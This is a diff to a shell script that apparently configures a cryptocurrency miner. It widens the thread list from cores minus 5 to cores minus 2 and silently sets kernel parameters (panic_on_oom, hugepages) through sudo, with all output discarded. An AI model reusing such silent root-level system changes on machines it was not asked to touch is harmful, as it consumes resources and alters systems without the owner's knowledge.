@@ -11,7 +11,7 @@ name="${name}"
 
 cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
-[ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 5))`]" || rx=""
+[ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 2))`]" || rx=""
 
 sudo sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1 || sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1
 sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
